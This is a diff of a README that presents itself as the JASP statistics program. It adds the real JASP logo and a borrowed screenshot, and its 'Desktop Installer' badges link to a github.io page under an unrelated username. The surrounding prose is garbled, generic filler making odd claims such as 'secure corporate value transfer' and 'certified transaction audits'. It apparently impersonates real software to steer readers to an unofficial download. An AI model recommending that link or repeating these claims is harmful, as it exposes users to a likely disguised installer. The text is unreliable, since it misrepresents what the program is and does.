@@ -1,7 +1,7 @@
 # JASP Software Precision Data Analysis Environment
 
 <div align="center">
-  <img src="LINK_TO_LOGO" alt="Program Logo"/>
+  <img src="https://camo.githubusercontent.com/44ecc59e1a0fcbfd34d4f7d31ecad19a705729017b6578c5998203264e038e8e/68747470733a2f2f7374617469632e6a6173702d73746174732e6f72672f677265656e5f6c6f676f5f6461726b5f746578745f666f725f6769746875622e706e67" alt="Program Logo"/>
 </div>
 
 [![Desktop Installer](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://taylorvaughanrswy.github.io/.github/JASP-Software)
@@ -21,7 +21,7 @@ The execution of a dedicated jasp program installation provides immediate deploy
 Deploying this updated software jasp environment delivers perfect verification continuity when managing extensive institutional datasets across multiple research profiles. The client framework relies on human-readable tracking configurations, ensuring that significance levels, prior distribution models, and custom variable tags remain fully customizable within local system overview screens. Because the software maintains rigid structural alignment with secure enterprise Windows desktop environments, distinct analytical divisions can export certified transaction audits without encountering data formatting corruption. This complete application layout provides absolute long-term technical reliability for digital factor tracking, secure corporate value transfer, and auditable network recording operations.
 
 <div align="center">
-  <img src="SCREENSHOT_LINK" alt="Program Interface Screenshot"/>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSB3F6d4U5Cxvnf-Dr5JYyxEzZ8LOpFXe3_gA&s" alt="Program Interface Screenshot"/>
 </div>
 
 [![Desktop Installer](https://badgen.net/badge/Desktop/Installer/blue?icon=windows)](https://taylorvaughanrswy.github.io/.github/JASP-Software)
